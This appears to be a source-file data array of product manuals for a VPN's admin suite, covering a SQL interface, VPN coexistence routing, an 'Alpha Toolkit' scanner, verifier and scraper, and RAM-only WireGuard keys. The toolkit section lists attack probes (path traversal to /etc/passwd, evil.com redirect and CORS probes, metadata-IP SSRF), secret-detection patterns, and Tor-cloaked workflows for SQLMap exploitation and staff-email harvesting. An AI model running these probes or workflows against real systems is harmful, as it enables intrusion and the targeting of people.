  • Connections auto-close after 5 minutes of inactivity.
  • Maximum 10 connections per session.

  Supported databases:
  PostgreSQL 11+, AWS RDS PostgreSQL, Aurora PostgreSQL,
  Supabase, Neon, Railway, ElephantSQL, CockroachDB (Postgres-compat),
  Google Cloud SQL for PostgreSQL, Azure PostgreSQL

4. MODE 3 — HTTP API TABLE

  Switch to: SQL Interface → tab "HTTP API"

  Turns any JSON REST API endpoint into a queryable data table.

  Configuration:
  URL:      https://api.example.com/v1/users
  Method:   GET / POST
  Headers:  Authorization: Bearer token
  Body:     (for POST — JSON body)
  Path:     JSON path to the array in response (e.g. "data.items")

  How it works:
  1. The ProxhqVPN server makes the HTTP request (through your VPN).
  2. The JSON response is parsed.
  3. If the response is an array (or nested array at JSON path):
     → Each array element becomes a table row.
     → Object keys become column headers.
  4. The table is sortable, filterable, and searchable.
  5. Export as CSV or JSON.

  Example use cases:
  • Query your GitHub repository list: GET /user/repos
  • Check AWS EC2 instances via boto3-backed API
  • Browse a Stripe payment list: GET /v1/charges
  • Inspect a REST API response without writing code
  • Build a quick admin view over any JSON endpoint

  JSON path examples:
  Response: { "data": { "items": [...] } }
  → Path: "data.items"

  Response: [ {...}, {...} ] (top-level array)
  → Path: (leave blank)

  Response: { "results": [...], "meta": {...} }
  → Path: "results"

5. SCHEMA EXPLORER

  SQL Interface → Schema tab (available in LOCAL DB and EXTERNAL DB modes)

  Left panel: list of all tables in the selected database.
  Click any table to expand:
  • Column name
  • Data type (text, integer, uuid, timestamptz, jsonb, etc.)
  • Nullable: YES / NO
  • Default value
  • Foreign key relationships (if any)
  • Primary key indicator

  Click "Query this table":
  → Auto-generates a SELECT * FROM [table] LIMIT 50 and runs it.

  Index explorer:
  Schema → Indexes tab → shows all indexes per table with type (btree, hash, gin)

  Row count estimates:
  Schema → Stats tab → estimated row counts per table (from pg_stat_user_tables)

6. CONNECTION MANAGER

  SQL Interface → Connections tab (External DB mode only)

  Saved connections (session-only — not persisted to disk):
  • Name, host, database, username (password masked)
  • Test button: verify connectivity before running queries
  • Active indicator: green dot if currently connected

  Pool status:
  Each external connection shows current pool usage:
  "3/10 connections in use"

  Close a connection:
  Click X on the connection → pool is drained and closed.

  NOTE: Connections are in-memory only. They are lost if the
  API server restarts or if you refresh the page.
  Re-enter credentials after any server restart.

7. QUERY HISTORY

  SQL Interface → History tab

  Stores the last 100 queries per session:
  • Timestamp, mode, connection, query text, row count, duration
  • Click any query to reload it into the editor
  • Copy query to clipboard
  • Star (favorite) queries for quick access

  Query templates (pre-built common queries):
  SQL Interface → Templates tab:
  • Active connections (pg_stat_activity)
  • Table sizes (pg_relation_size)
  • Index usage stats
  • Long-running queries
  • Blocking queries
  • Last N rows per table

8. SECURITY CONSTRAINTS

  Local DB mode:
  • SELECT only — no data modification
  • Query timeout: 30 seconds (prevents long-running analytics)
  • Result limit: 10,000 rows maximum
  • No direct pg_catalog access to sensitive system tables

  External DB mode:
  • Full SQL — admin responsibility to use appropriately
  • Queries run with the credentials you provide — no privilege escalation
  • 30-second query timeout (adjustable to 120s max)
  • Connection strings are never logged

  HTTP API mode:
  • All requests route through the ProxhqVPN server IP
  • 30-second request timeout
  • Response size limit: 10 MB (prevents memory exhaustion)

  Admin role required for all modes. Clerk auth enforced.
  All queries visible in Terminal → Audit Log (if terminal is used).

9. COMMON QUERIES REFERENCE

  ProxhqVPN Local DB quick reference:

  All active VPN nodes:
    SELECT * FROM nodes WHERE status = 'active';

  Firewall rules (active only, by priority):
    SELECT rule_type, direction, ip_cidr, port, protocol, description
    FROM firewall_rules
    WHERE active = true
    ORDER BY priority ASC;

  Ghost Trace anomalies (score > 60):
    SELECT peer_id, anomaly_score, alert_type, created_at
    FROM ghost_trace_observations
    WHERE anomaly_score > 60
    ORDER BY anomaly_score DESC
    LIMIT 50;

  Canary token trigger log (last 7 days):
    SELECT ct.name, ct.token_type, tr.source_ip,
           tr.user_agent, tr.triggered_at
    FROM canary_triggers tr
    JOIN canary_tokens ct ON ct.id = tr.token_id
    WHERE tr.triggered_at > NOW() - INTERVAL '7 days'
    ORDER BY tr.triggered_at DESC;

  Ambassador referral earnings:
    SELECT a.name, a.promo_code,
           COUNT(ar.id) AS referrals,
           SUM(ar.commission_amount) AS total_commission
    FROM ambassadors a
    LEFT JOIN ambassador_referrals ar ON ar.ambassador_id = a.id
    GROUP BY a.id
    ORDER BY total_commission DESC;

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "vpn-coexist-manual",
    title: "VPN Coexistence",
    subtitle: "fwmark, double-hop, network namespace, and routing-table modes for running alongside any VPN",
    version: "1.1",
    pages: 14,
    icon: Settings,
    iconColor: "text-cyan-400",
    tier: "pro",
    content: `VPN Coexistence — User Manual
Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Use Cases
2. Auto-Detection of Running VPNs
3. Mode 1 — fwmark (Recommended)
4. Mode 2 — Double-Hop
5. Mode 3 — Network Namespace
6. Mode 4 — Routing Table
7. Exception Rules
8. MTU Optimizer
9. Script Generator
10. Per-VPN Configuration Notes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & USE CASES

  VPN Coexistence (/vpn-coexist) solves one of the most common
  enterprise and power-user problems: running ProxhqVPN alongside
  another VPN simultaneously without routing conflicts.

  Common coexistence scenarios:

  Corporate VPN + ProxhqVPN:
  You must connect to a corporate WireGuard or OpenVPN VPN for
  work, while also keeping ProxhqVPN active for privacy.
  → Use fwmark mode: separate fwmarks route corporate subnets to
    corporate VPN and all other traffic to ProxhqVPN.

  Tailscale + ProxhqVPN:
  Both use WireGuard kernel module. Without coordination, they
  compete for the same routing table entries.
  → ProxhqVPN auto-detects Tailscale, assigns non-conflicting
    fwmark values, and adjusts routing tables.

  NordVPN / ExpressVPN + ProxhqVPN (double-hop):
  Route ProxhqVPN traffic through a commercial VPN for an extra
  hop. Your traffic: Device → Commercial VPN → ProxhqVPN exit.
  From the perspective of any observer, your traffic comes from
  the ProxhqVPN node IP (not your real IP, not the commercial VPN IP).

  ZeroTier + ProxhqVPN:
  ZeroTier creates L2 overlay networks. ProxhqVPN routes internet
  traffic. Both can coexist using routing table mode.

2. AUTO-DETECTION OF RUNNING VPNS

  VPN Coexistence → Auto-Detect tab → "Scan for Running VPNs"

  Detected VPN clients:
  • NordVPN     (nordvpn process, nordlynx interface)
  • ExpressVPN  (expressvpnd process, tun0 interface)
  • ProtonVPN   (protonvpn-cli process)
  • Mullvad     (mullvad CLI, wg-mullvad interface)
  • Surfshark   (surfshark process, tun interface)
  • Tailscale   (tailscaled, tailscale0 interface)
  • ZeroTier    (zerotier-one, ztXXXXXX interface)
  • Custom WG   (any wgX interface not belonging to ProxhqVPN)

  For each detected VPN, the tool shows:
  • Process name and PID
  • WireGuard interface name
  • Current fwmark value in use
  • Routing table used
  • Subnet routes claimed

  ProxhqVPN then suggests non-conflicting configuration:
  "Detected Tailscale using fwmark 51820, table 52. ProxhqVPN
   will use fwmark 51821 and table 200."

3. MODE 1 — FWMARK (RECOMMENDED)

  fwmark (firewall mark) is a Linux mechanism that attaches a
  numeric mark to packets. Different routing tables apply based
  on the mark. This keeps VPN traffic completely isolated without
  any packet leakage between tunnels.

  How it works:
  1. ProxhqVPN adds a WireGuard fwmark to all tunnel packets.
  2. An ip rule routes marked packets to ProxhqVPN's routing table.
  3. Unmarked packets (corporate VPN, LAN, etc.) use their own tables.
  4. No packet can accidentally route through the wrong tunnel.

  Default assignment:
    ProxhqVPN: fwmark 51820 → routing table 200
    (if conflict detected, reassigned to fwmark 51821 → table 201, etc.)

  Generated configuration:
    # Set ProxhqVPN fwmark
    wg set wg0 fwmark 51820

    # Create routing table for ProxhqVPN
    ip route add default dev wg0 table 200
    ip rule add fwmark 51820 lookup 200

    # Verify
    ip rule show
    ip route show table 200

  Compatibility: Linux only (fwmark is a Linux kernel feature).
  macOS/Windows: use Routing Table mode instead.

4. MODE 2 — DOUBLE-HOP

  Double-Hop routes your traffic through a commercial VPN FIRST,
  then through ProxhqVPN as the final exit. This creates a 2-hop
  anonymization chain.

  Traffic flow:
  Your device → Commercial VPN server → ProxhqVPN node → Internet

  Your visible IP at destination = ProxhqVPN node IP
  Commercial VPN server sees: your real IP → ProxhqVPN traffic
  ProxhqVPN server sees: commercial VPN IP → your traffic
  Neither knows the full picture.

  Setup:
  1. Connect to the commercial VPN first (NordVPN, ExpressVPN, etc.)
  2. Open VPN Coexistence → Double-Hop tab.
  3. ProxhqVPN auto-detects the commercial VPN's DNS and gateway.
  4. Add ProxhqVPN's server IP to the commercial VPN's split tunnel
     exceptions (so the WireGuard handshake packet goes directly).
  5. Click "Apply Double-Hop Configuration".
  6. Your ProxhqVPN traffic now routes through the commercial VPN.

  Commercial VPN exception (critical):
  The ProxhqVPN server IP MUST be excluded from the commercial
  VPN's tunnel. Otherwise: traffic goes VPN→ProxhqVPN, but the
  WireGuard handshake to ProxhqVPN never completes (loop).

  Auto-exception:
  VPN Coexistence → Double-Hop → "Auto-Configure Exception"
  → Automatically adds ProxhqVPN server IPs to the commercial
    VPN client's split tunnel exclude list.

5. MODE 3 — NETWORK NAMESPACE

  Linux network namespaces provide complete kernel-level isolation.
  ProxhqVPN runs in its own network namespace — it has its own
  interfaces, routing tables, and firewall rules. Other VPNs in
  the default namespace cannot see or interfere with it.

  Isolation level: COMPLETE. No possibility of cross-tunnel routing.

  Setup (requires root):
  VPN Coexistence → Namespace Mode → "Create Namespace"
  → Creates a network namespace named "proxhq"
  → Moves ProxhqVPN WireGuard interface into the namespace
  → Configured applications route through the namespace

  Run applications in the ProxhqVPN namespace:
    # Run Firefox through ProxhqVPN namespace only
    sudo ip netns exec proxhq firefox

    # Run terminal through ProxhqVPN namespace
    sudo ip netns exec proxhq bash

  Use case: isolate specific applications (browser, torrent client)
  to always use ProxhqVPN, while other apps use the corporate VPN.

  Limitation: requires root access on Linux. Not available on macOS
  or Windows.

6. MODE 4 — ROUTING TABLE

  Separate routing tables are created for ProxhqVPN and other VPNs.
  Traffic is directed to the correct table based on destination
  subnet, not fwmark.

  This is the most cross-platform compatible mode:
  Works on: Linux, macOS (route add), Windows (route add)

  Linux setup (auto-generated):
    # ProxhqVPN routing table (table 200)
    ip route add 0.0.0.0/0 dev wg0 table 200

    # Route specific destination through ProxhqVPN
    ip rule add to 192.168.100.0/24 lookup main   # Corporate subnet via corporate VPN
    ip rule add to 0.0.0.0/0 lookup 200            # All else via ProxhqVPN

  macOS setup (auto-generated):
    route add -net 10.0.0.0/8 -interface utun0     # Corporate subnets via corp VPN
    route add -net 0.0.0.0/1 -interface utun1      # Internet via ProxhqVPN
    route add -net 128.0.0.0/1 -interface utun1

  Windows setup (auto-generated via netsh):
    route add 10.0.0.0 mask 255.0.0.0 [corp-gateway] metric 1
    route add 0.0.0.0 mask 0.0.0.0 [proxhq-gateway] metric 2

7. EXCEPTION RULES

  Exception rules give per-destination routing control:

  bypass-proxhq:
    Specific destinations bypass ProxhqVPN and use default routing.
    Use for: corporate subnets, LAN devices, local services.
    Example: bypass-proxhq 10.0.0.0/8 (corporate intranet)

  force-proxhq:
    Specific destinations ALWAYS use ProxhqVPN even if another
    VPN has claimed that subnet.
    Use for: privacy-critical destinations you always want private.
    Example: force-proxhq 0.0.0.0/0 (force all through ProxhqVPN)

  block:
    Specific destinations are blocked entirely — neither VPN routes
    them. Traffic is dropped.
    Use for: blocking ad/tracker IPs at the routing level.
    Example: block 192.168.1.200/32 (block a specific LAN device)

  Exception rules UI:
  VPN Coexistence → Exception Rules → + Add Rule
  Select type → enter IP/CIDR → Save → Apply.

8. MTU OPTIMIZER

  Running two VPN tunnels simultaneously adds overhead. Each
  WireGuard tunnel subtracts ~60 bytes from the MTU:
  • Physical MTU: typically 1500 bytes (Ethernet)
  • WireGuard overhead: 60 bytes
  • Single VPN MTU: 1440 bytes
  • Double-Hop MTU: 1380 bytes (two WireGuard headers)

  If MTU is not correctly configured:
  • Large packets are fragmented (performance drop)
  • Some connections stall or fail (especially HTTPS with TLS records)

  MTU Optimizer:
  VPN Coexistence → MTU Optimizer → "Run MTU Test"
  Tests the optimal MTU value by sending probe packets of varying sizes.
  Automatically sets the correct MTU on all VPN interfaces.

  Manual MTU setting:
    ip link set mtu 1380 dev wg0
    wg set wg0 mtu 1380

9. SCRIPT GENERATOR

  VPN Coexistence → Script Generator

  Select your mode, detected VPN, and exception rules.
  Click "Generate Script" → downloads a .sh (Linux/macOS) or .bat (Windows) file.

  The generated script:
  • Sets correct fwmark values
  • Creates routing tables
  • Adds ip rule entries
  • Configures exception routes
  • Sets correct MTU on all interfaces
  • Includes undo instructions (reset script)

  Always review the generated script before running it.
  Test in a non-production environment first.

10. PER-VPN CONFIGURATION NOTES

  NordVPN:
    NordLynx uses WireGuard with fwmark 51820. ProxhqVPN will
    auto-detect and switch to fwmark 51821.
    Recommended mode: fwmark (Linux) or Double-Hop

  ExpressVPN:
    Uses OpenVPN or Lightway (UDP). Creates tun0 interface.
    No WireGuard conflict. Use routing-table mode.
    For Double-Hop: exclude ProxhqVPN server IPs from ExpressVPN tunnel.

  ProtonVPN:
    WireGuard with custom fwmark. Auto-detected.
    Recommended mode: fwmark with auto-detection.

  Mullvad:
    WireGuard with interface name wg-mullvad-XXXX.
    Auto-detected. Recommended mode: fwmark.

  Tailscale:
    Uses WireGuard, fwmark 51820, table 52 (default).
    ProxhqVPN auto-adjusts to table 200, fwmark 51821.
    Recommended mode: fwmark (auto-configured by detection).

  ZeroTier:
    Creates ztXXXX interfaces. Routes L2 overlay traffic.
    No WireGuard conflict. Use routing-table mode.
    Add ZeroTier subnets as bypass-proxhq exception rules.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "alpha-toolkit-manual",
    title: "Alpha Toolkit — Universal Scanner, Verifier & Web Scraper",
    subtitle: "Complete reference for the 3-tool suite with Tor Cloak and Scanner→Verifier pipeline",
    version: "2.2",
    pages: 18,
    icon: Zap,
    iconColor: "text-emerald-400",
    tier: "pro",
    content: `Alpha Toolkit — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LEGAL NOTICE: Only scan targets you own or have written
permission to test. Unauthorized scanning is illegal.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview — 3-Tool Suite
2. Tor Cloak (Global)
3. Tool 1 — Universal Scanner (v2.2.0)
4. Scanner Modes (Network / Security / Exploit / Full)
5. Scanner Command Flags Reference
6. Tool 2 — Vulnerability Verifier
7. Scanner → Verifier Pipeline
8. Verifier Output: Confirmed vs. False Positive
9. Tool 3 — Web Scraper
10. Web Scraper Database Schema (14 tables)
11. Exporting Scraped Data
12. Common Workflows

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW — 3-TOOL SUITE

  Alpha Toolkit (/alpha-tools) is an integrated 3-tool security
  research suite:

  Tool 1 — Universal Scanner v2.2.0:
    Scans targets for security vulnerabilities, misconfigurations,
    exposed credentials, and network services. Supports 35+
    programming languages, 200+ vulnerability patterns, multi-step
    exploit chain detection, port scanning, and service fingerprinting.

  Tool 2 — Vulnerability Verifier:
    Takes the Scanner's HTML report and ACTIVELY PROBES each finding
    against the live target to confirm real exposure vs. false positive.
    TLS handshakes, TCP banner grabs, SQL probes, SSRF checks.

  Tool 3 — Web Scraper:
    Browser-based recursive web scraper. Captures 14 data types
    (pages, links, emails, forms, scripts, cookies, etc.) into a
    local SQLite database. Exportable as .sqlite, CSV, or JSON.

  All three tools support Tor Cloak (Section 2).
  Tools are designed to work as a pipeline (Section 7).

2. TOR CLOAK (GLOBAL)

  The Tor Cloak toggle at the top of the Alpha Toolkit page routes
  ALL tool traffic through the Tor SOCKS5 proxy at 127.0.0.1:9050.

  When Tor Cloak is ON:
  • The Tor badge shows your current Tor exit node IP address.
  • ALWAYS verify the badge shows a Tor exit IP (not your real IP)
    before starting any scan.
  • All scanner requests, verifier probes, and scraper fetches
    route through Tor circuits.
  • Tor circuit rotation: circuits are rotated every 10 minutes
    automatically. Click "New Circuit" to rotate immediately.

  When Tor Cloak is OFF:
  • Scanner/Verifier/Scraper use the ProxhqVPN server's IP.
  • Still anonymous (ProxhqVPN server IP, not your real IP).
  • Faster than Tor.

  IMPORTANT: Tor Cloak routes traffic through Tor's EXISTING
  circuits. It does not guarantee a specific exit country.
  For country-specific exit: use the OnionBrowser (/onion-browser)
  with a custom exit node instead.

3. TOOL 1 — UNIVERSAL SCANNER V4.0

  Alpha Toolkit → Scanner tab

  Target input:
  Network/All mode:   IP address or hostname (e.g. 192.168.1.1 or target.com)
  Security mode:      File path or URL to source code repository
  Exploit mode:       URL to the web application endpoint

  Options:
  Port Range:         e.g. 1-10000 (network scan only)
  Threads:            1–50 (parallel scan threads)
  Language override:  --lang php  (force detection, e.g. for mixed repos)
  Extra flags:        any additional scanner flags (see Section 5)
  Tor Cloak:          route through Tor (top-right toggle)

  Supported languages (35+):
  Python, JavaScript, TypeScript, PHP, Ruby, Java, C, C++, C#,
  Go, Rust, Swift, Kotlin, Scala, Perl, Bash, PowerShell,
  Lua, R, MATLAB, Groovy, Clojure, Elixir, F#, OCaml,
  Terraform, CloudFormation, Kubernetes YAML, Dockerfile,
  Ansible, Nginx/Apache config, SQL files, .env files,
  HTML, CSS, XML, JSON

4. SCANNER MODES

  NETWORK SCAN:
    What it does: TCP port scanning + service fingerprinting +
                  banner grabbing via nmap integration.
    Target: IP address or hostname.
    Output:
    • Open ports list with service name + version banner
    • OS fingerprint (if detectable)
    • SSL/TLS cert info for any HTTPS ports
    • Common default credentials check for detected services
    • Script scan results (nmap -sC equivalent)

    Example: scan a server for all common services:
    Target: 192.168.1.100  Ports: 1-10000  Threads: 50
    → Finds: 22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL, 5432/PgSQL

  SECURITY AUDIT:
    What it does: Scans source code or config files for:
    • Hardcoded secrets: API keys, passwords, tokens in code
    • Weak cryptography: MD5 hashes, DES, 512-bit RSA
    • Dangerous functions: eval(), exec(), system(), os.popen()
    • SQL query construction: string concatenation = SQLi risk
    • Deserialization: unserialize(), pickle.loads() without validation
    • Path construction: user input in file paths
    • Insecure temp files, world-readable files
    Target: GitHub URL, local file upload, or pasted code.

    Secret detection patterns:
    • AWS keys: AKIA[0-9A-Z]{16}
    • GCP keys: AIza[0-9A-Za-z-_]{35}
    • GitHub tokens: ghp_[a-zA-Z0-9]{36}
    • Private keys: -----BEGIN RSA PRIVATE KEY-----
    • Passwords: password=, passwd=, pwd= followed by a value
    • Connection strings: postgresql://, mongodb://, redis://

  EXPLOIT SCAN:
    What it does: Tests 200+ vulnerability patterns against a live URL.
    Target: URL of the web application.
    Tests include:
    • XSS reflection: injects probe in every URL parameter
    • SQL injection: error-based probe on all parameters
    • Path traversal: ../../../../etc/passwd in file parameters
    • Open redirect: ?next=https://evil.com probe
    • CORS: Origin: https://evil.com → check Access-Control-Allow-Origin
    • SSRF: ?url=http://169.254.169.254/ probe
    • Default admin panels: /admin, /wp-admin, /phpmyadmin, /manager
    • Exposed files: /.git/, /.env, /config.php, /backup.sql
    • HTTP methods: OPTIONS, TRACE, PUT probe

  FULL SCAN:
    Runs all three modes sequentially on the same target.
    Generates a comprehensive HTML report consolidating all findings.
    Longest runtime: 5–30 minutes depending on target size.

5. SCANNER COMMAND FLAGS REFERENCE

  --lang [language]
    Force scanner to treat all files as specified language.
    Example: --lang python (useful for .py files with unusual extensions)

  --deep
    Enable deep scan mode: recursively follow all links and scan
    discovered pages/endpoints. May significantly increase scan time.

  --config-audit
    Enable configuration file auditing: scans .env, .yaml, .json,
    nginx.conf, apache.conf, etc. for security misconfigurations.

  --no-banner
    Skip banner grabbing on network scan (faster, less detectable).

  --rate [N]
    Limit scan rate to N requests per second (default: 20/s).
    Use for sensitive targets: --rate 2

  --timeout [ms]
    Per-request timeout in milliseconds (default: 3000ms).

  --report-path [path]
    Save report to specified path on the server (admin only).

  --exclude [pattern]
    Exclude URLs matching pattern from exploit scan.
    Example: --exclude "logout|delete" (avoid destructive endpoints)

  --output json
    Return results as JSON instead of HTML report (for API use).

6. TOOL 2 — VULNERABILITY VERIFIER

  Alpha Toolkit → Verifier tab

  The Verifier takes an Alpha Scanner HTML report and ACTIVELY PROBES
  each finding against the live target to determine:
  • CONFIRMED: finding is real, actively exploitable
  • FALSE POSITIVE: finding appears in report but not actually vulnerable
  • UNKNOWN: could not determine (timeout, CAPTCHA, WAF)

  How probing works:
  • SQL error findings: sends the same payload again, looks for DB error
  • Path traversal: tries to actually read /etc/passwd via the path
  • XSS reflection: checks if probe string appears unescaped in response
  • SSRF: checks if the server makes an outbound request to a canary URL
  • Exposed file (.env, .git): checks if file is downloadable
  • Open port: makes TCP connection to confirm port is open
  • TLS findings: performs new TLS handshake, records cipher/protocol
  • CDN detection: if target is behind Cloudflare/Akamai, flags findings
    as "CDN — may not affect origin directly"

7. SCANNER → VERIFIER PIPELINE

  The Alpha Toolkit is designed as a sequential pipeline:
  Scanner detects → Verifier confirms → Confirmed findings actioned.

  Step 1: Run Universal Scanner (any mode).
  Step 2: Wait for scan to complete. Status shows 100%.
  Step 3: Click "Send to Verifier" (green button, top of results panel).
           → App automatically switches to Verifier tab.
           → HTML report is pre-loaded (~N KB shown in report info).
  Step 4: (Optional) Set a Target URL Override.
           If the scanner detected a base domain but the finding
           is on a specific path, set the override to the path.
  Step 5: (Optional) Toggle Tor Cloak if not already on.
  Step 6: Click "Verify Findings".
  Step 7: Verifier probes each finding. Progress bar shows status.
  Step 8: Results appear with confirmation status per finding.

  Confirmed findings (red):
  Actively exploitable. Requires immediate remediation.

  False positives (grey):
  Scanner detected a pattern but active probing found no vulnerability.
  Common causes: WAF blocks, framework protection, test environment data.

  CDN warning (yellow):
  The target is behind a CDN (Cloudflare, Fastly, Akamai).
  Findings may not apply to the origin server behind the CDN.

8. VERIFIER OUTPUT: CONFIRMED VS. FALSE POSITIVE

  Final Exposure Report includes:
  • Total findings from Scanner
  • Confirmed exploitable: N
  • False positives filtered: M
  • CDN warnings: K
  • Overall risk score (CRITICAL / HIGH / MEDIUM / LOW)
  • Per-finding: technique, evidence, recommended fix

  Download: "Download Exposure Report" → formatted .txt file
  Color-coded: RED = confirmed, GREY = false positive

9. TOOL 3 — WEB SCRAPER

  Alpha Toolkit → Scraper tab

  The Web Scraper runs in the browser and crawls any website,
  storing all captured data in a local SQLite database.

  Configuration:
  Start URL:    https://target.com (starting point for crawl)
  Depth:        1–10 (how many link-hops from start URL to follow)
  Max pages:    1–10,000 (total pages to capture)
  Same-domain:  YES/NO (follow only links on the same domain?)
  Tor Mode:     route all fetch requests through Tor (top-right toggle)
  Delay:        0–5000ms between requests (polite crawling)

  Include/exclude patterns:
  Include: only crawl URLs matching regex (e.g. /api/, /blog/)
  Exclude: skip URLs matching regex (e.g. /logout, /delete, /admin)

  Click "Start Scrape". Live progress bar shows:
  Pages crawled, links found, emails discovered, forms captured.

10. WEB SCRAPER DATABASE SCHEMA (14 TABLES)

  Table: pages
    url, title, meta_description, html_content (full page HTML),
    http_status_code, content_type, crawled_at, depth_level

  Table: links
    source_url, target_url, anchor_text, is_internal, is_external,
    is_broken (404/500), link_type (href/src/action)

  Table: emails
    email_address, found_on_url, context_snippet (surrounding text),
    is_verified_format, first_seen

  Table: phones
    phone_number, found_on_url, raw_text (as it appeared on page),
    country_code_detected

  Table: images
    image_url, alt_text, width, height, found_on_url

  Table: forms
    form_action, form_method, found_on_url, form_id, form_name,
    has_csrf_token, input_fields (JSON array of {name, type, value})

  Table: opengraph
    url, og_title, og_description, og_image, og_type, og_site_name,
    og_url, og_locale

  Table: jsonld
    url, json_ld_type, raw_json (full JSON-LD block), schema_type

  Table: headers
    url, header_name, header_value, captured_at
    (All HTTP response headers per page)

  Table: cookies
    url, cookie_name, cookie_value, domain, path,
    is_http_only, is_secure, same_site, expires_at

  Table: scripts
    script_url, is_inline, integrity_hash (SRI), crossorigin,
    found_on_url, script_preview (first 200 chars if inline)

  Table: stylesheets
    stylesheet_url, media_type, is_inline, found_on_url

  Table: assets
    asset_url, asset_type (font/video/audio/pdf/other),
    found_on_url, file_size_estimate

  Table: metadata
    crawl_id, start_url, start_time, end_time, total_pages,
    total_links, max_depth, tor_mode_active, user_agent_used

11. EXPORTING SCRAPED DATA

  Three export formats:

  SQLite (.sqlite):
    Full database file — open in DB Browser for SQLite.
    Query across all 14 tables with full SQL support.
    Best for: deep analysis, correlation queries.

  CSV (per table):
    One .csv file per table.
    Download as .zip (all tables) or individual table CSV.
    Best for: spreadsheet analysis, Excel pivot tables.

  JSON (full export):
    All tables as a single nested JSON structure.
    Best for: programmatic processing, API ingestion.

  Export: Scraper tab → Results → "Export" → select format → Download.

12. COMMON WORKFLOWS

  WORKFLOW: Bug Bounty Recon on a Target Domain
  1. Tor Cloak: ON.
  2. Scanner → Exploit Scan → target.com.
  3. Wait for scan. Note findings.
  4. Send to Verifier → confirm critical/high findings.
  5. Scraper → crawl target.com depth 3 → export emails + forms.
  6. Send confirmed SQLi findings to SQLMap for full exploitation.
  7. Compile Ghost Chain report with all confirmed findings.

  WORKFLOW: Source Code Security Audit
  1. Tor Cloak: OFF (local source code, no network needed).
  2. Scanner → Security Audit → paste GitHub URL or upload zip.
  3. Review hardcoded secrets and dangerous function calls.
  4. Download HTML report.
  5. Send to Verifier with Target URL = staging environment.
  6. Verifier confirms which code vulnerabilities are actually reachable.

  WORKFLOW: Competitive Intelligence / OSINT
  1. Tor Cloak: ON.
  2. Scraper → target domain depth 5, same-domain only.
  3. Export emails table → list of all staff email addresses found.
  4. Export forms table → all form endpoints (API recon).
  5. Export scripts table → third-party tools/trackers used.
  6. Cross-reference emails with Dark Web Monitor.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── RAM-Only WireGuard Keys ───────────────────────────────────────────────
  {
    id: "ram-wireguard-manual",
    title: "RAM-Only WireGuard Key Architecture",
    subtitle: "Mullvad-style server key management — no disk key material",
    version: "1.0",
    pages: 8,
    icon: Lock,
    iconColor: "text-cyan-400",
    tier: "both",
    content: `ProxhqVPN RAM-Only WireGuard Key Architecture
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Security Model
2. How It Works (Boot Sequence)
3. Files On Disk vs Files In RAM
4. API Endpoint: wg-key
5. Client-Side Key Handling
6. Threat Model
7. Node IDs & Configuration
8. Troubleshooting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & SECURITY MODEL

ProxhqVPN implements a Mullvad-style RAM-only WireGuard key architecture
across all 4 active server nodes:

  Node 61 — Chicago, USA
  Node 62 — London, UK
  Node 63 — Los Angeles, USA
  Node 64 — Tokyo, Japan

The server-side WireGuard private key is NEVER written to any persistent
storage (disk, SSD, NVME, or swap). It exists exclusively in volatile RAM
during the time the node is running.

Security implications:
  • Physical seizure of a running server yields no persistent key material
  • Power-cycling or rebooting the node permanently destroys the key
  • Cold-boot attacks are mitigated — /dev/shm is a tmpfs (in-memory FS)
  • Disk forensics on a powered-off node reveals no WireGuard private key
  • Only the encrypted API can reconstruct the key (requires PSK + nodeId)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. HOW IT WORKS (BOOT SEQUENCE)

Step 1: Node boots. wg-quick@wg0 is NOT yet started.

Step 2: proxhq-wg-init.service starts (Before=wg-quick@wg0.service):
  a. Runs /usr/local/bin/proxhq-wg-init.sh
  b. Script POSTs to the ProxhqVPN API:
       POST /api/daemon-inbound/wg-key
       Headers: X-Daemon-PSK: <pre-shared-key>
       Body: {"nodeId": <N>}
  c. API validates PSK + nodeId. Returns private key JSON.
  d. Script writes key to /dev/shm/wg-private.key (chmod 600)
  e. Script assembles /dev/shm/wg0.conf from base config + key

Step 3: wg-quick@wg0.service starts using systemd override:
  Environment=WG_QUICK_USERSPACE_IMPLEMENTATION=wireguard-go
  ExecStart=/usr/bin/wg-quick up /dev/shm/wg0.conf

Step 4: WireGuard tunnel is active. Key is in RAM only.

On shutdown/reboot:
  • /dev/shm is cleared by the kernel
  • Key is gone
  • Disk image shows: wg0-base.conf (no PrivateKey), init script only

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. FILES ON DISK vs FILES IN RAM

ON DISK (persists across reboots — contains NO key material):
  /etc/wireguard/wg0-base.conf          # [Interface] without PrivateKey
  /usr/local/bin/proxhq-wg-init.sh      # provisioning script
  /etc/systemd/system/proxhq-wg-init.service
  /etc/systemd/system/wg-quick@wg0.service.d/ram-config.conf

IN RAM ONLY — /dev/shm/ (cleared on power-off):
  /dev/shm/wg-private.key               # WireGuard private key
  /dev/shm/wg0.conf                     # full config = base + key

